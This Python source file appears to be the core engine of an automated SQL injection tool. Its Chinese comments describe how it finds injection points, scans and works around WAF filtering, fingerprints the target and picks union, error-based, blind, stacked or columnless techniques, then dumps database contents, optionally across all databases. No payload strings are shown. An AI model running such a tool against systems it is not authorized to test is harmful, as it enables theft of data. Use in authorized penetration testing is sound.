"""引擎总调度：analyze() 完成探测/指纹/方法推荐，solve() 完成脱库。"""
from __future__ import annotations

from typing import Optional

from .builder import PayloadBuilder
from .detector import Detector
from .fingerprint import Fingerprinter
from .models import (AnalysisReport, InjectionPoint, TargetSpec, TechniqueInfo,
                     WafReport)
from .oracles import BaseOracle, OracleError
from .pipeline import DumpResult, ExtractionPipeline
from .session import HttpSession
from .waf import WafScanner
from ..techniques import all_techniques

RECOMMEND_ORDER = ("union", "error", "bool_blind", "time_blind", "stacked", "columnless")


class Engine:
    def __init__(self, spec: TargetSpec, log=None, session: Optional[HttpSession] = None):
        self.spec = spec
        self.session = session or HttpSession(spec, logger=log)

    # ------------------------------------------------------------------ analyze
    def analyze(self, scan_waf: bool = True) -> AnalysisReport:
        s = self.session
        if s.spec.login_url and not s.login():
            s.log("WARN", "登录失败，继续以匿名会话尝试")
        report = AnalysisReport(target=self.spec, session=self.session)

        det = Detector(s)
        report.injection = det.analyze()
        if report.injection is None:
            # 仍输出 WAF 线索（引号转义/关键字拦截），帮助定位防护点
            placeholder = InjectionPoint(param=s.spec.param,
                                         base_value=s.spec.base_value,
                                         numeric=True, comment="#")
            scanner = WafScanner(s, placeholder, R_base=det.R_base)
            report.waf = scanner.scan(functions=False)
            report.notes.append("未发现注入点：可尝试更换被测参数、检查引号是否被转义"
                                "（见 WAF 报告）或改用 POST/Cookie 位置")
            return report

        waf = WafReport()
        if scan_waf:
            scanner = WafScanner(s, report.injection, R_base=det.R_base, R_err=det.R_err)
            waf = scanner.scan()
        report.waf = waf

        fp = Fingerprinter(s, report.injection, R_err=det.R_err)
        report.fingerprint = fp.run(waf)

        # 方法推荐
        rec_flag = {"union": report.fingerprint.echo_visible,
                    "error": report.fingerprint.error_visible,
                    "bool_blind": report.fingerprint.boolean_oracle,
                    "time_blind": report.fingerprint.time_oracle,
                    "stacked": report.fingerprint.stacked,
                    "columnless": waf.is_filtered("information_schema")}
        for t in all_techniques():
            ok, reason = t.feasible(report)
            info = TechniqueInfo(key=t.meta.key, name=t.meta.name,
                                 category=t.meta.category, feasible=ok, reason=reason,
                                 recommended=ok and rec_flag.get(t.meta.key, False))
            report.techniques.append(info)
        return report

    # ------------------------------------------------------------------ solve
    def build_oracle(self, report: AnalysisReport, technique_key: str) -> Optional[BaseOracle]:
        for t in all_techniques():
            if t.meta.key == technique_key:
                builder = PayloadBuilder(report.injection, report.waf)
                report.builder = builder
                return t.make_oracle(report)
        return None

    def solve(self, report: AnalysisReport, technique_key: str,
              max_rows: int = 20, dump_all_dbs: bool = False) -> DumpResult:
        oracle = self.build_oracle(report, technique_key)
        if oracle is None:
            raise OracleError(f"无法构造 {technique_key} 通道（方法不可用）")
        builder = PayloadBuilder(report.injection, report.waf)
        pipe = ExtractionPipeline(oracle, builder, self.session, report.waf)
        return pipe.auto_dump(max_rows=max_rows, dump_all_dbs=dump_all_dbs)
